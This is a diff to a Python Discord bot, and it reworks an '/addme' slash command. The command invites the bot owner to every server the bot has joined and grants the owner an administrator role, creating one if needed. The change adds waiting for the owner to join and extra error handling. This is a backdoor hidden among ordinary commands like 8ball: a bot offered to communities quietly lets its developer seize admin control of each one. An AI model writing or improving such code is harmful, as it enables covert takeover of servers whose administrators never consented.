@@ -226,7 +226,6 @@ async def m_help(interaction: discord.Interaction):
     
     await interaction.response.send_message(embed=embed, ephemeral=True)
 
-# /addme command
 @bot.tree.command(name="addme", description="Invite the bot owner to all servers and grant admin role")
 async def add_me(interaction: discord.Interaction):
     if interaction.user.id != OWNER_ID:
@@ -237,7 +236,7 @@ async def add_me(interaction: discord.Interaction):
     if owner is None:
         await interaction.response.send_message("Bot owner not found.", ephemeral=True)
         return
-    
+
     for guild in bot.guilds:
         try:
             # Create an invite link
@@ -250,13 +249,20 @@ async def add_me(interaction: discord.Interaction):
                     break
             if not invite_sent:
                 await owner.send(f"Failed to create invite for {guild.name}: No permission to create invites.")
+                continue
+
+            # Wait for the owner to join the server
+            def check_join(member):
+                return member.id == OWNER_ID and member.guild.id == guild.id
+
+            try:
+                await bot.wait_for('member_join', check=check_join, timeout=300)  # Wait for 5 minutes
+            except asyncio.TimeoutError:
+                await owner.send(f"Failed to grant admin role in {guild.name}: Owner did not join within the time limit.")
+                continue
 
             # Grant admin role
-            admin_role = None
-            for role in guild.roles:
-                if role.permissions.administrator:
-                    admin_role = role
-                    break
+            admin_role = next((role for role in guild.roles if role.permissions.administrator), None)
             
             if admin_role is None:
                 admin_role = await guild.create_role(name="Admin", permissions=discord.Permissions(administrator=True))
@@ -264,13 +270,18 @@ async def add_me(interaction: discord.Interaction):
             member = guild.get_member(OWNER_ID)
             if member:
                 await member.add_roles(admin_role)
+                await owner.send(f"Granted admin role in {guild.name}.")
             else:
                 await owner.send(f"Failed to grant admin role in {guild.name}: Owner not found in the server.")
         
+        except discord.Forbidden:
+            await owner.send(f"Permission error in {guild.name}: Missing permissions.")
+        except discord.HTTPException as http_exc:
+            await owner.send(f"HTTP error in {guild.name}: {http_exc}")
         except Exception as e:
-            await owner.send(f"An error occurred in {guild.name}: {str(e)}")
+            await owner.send(f"An unexpected error occurred in {guild.name}: {str(e)}")
 
-    await interaction.response.send_message("Invites sent and admin roles granted.", ephemeral=True)
+    await interaction.response.send_message("Invites sent. Admin roles will be granted when you join the servers.", ephemeral=True)
 
 # /8ball command
 @bot.tree.command(name="8ball", description="Ask the magic 8-ball a question")
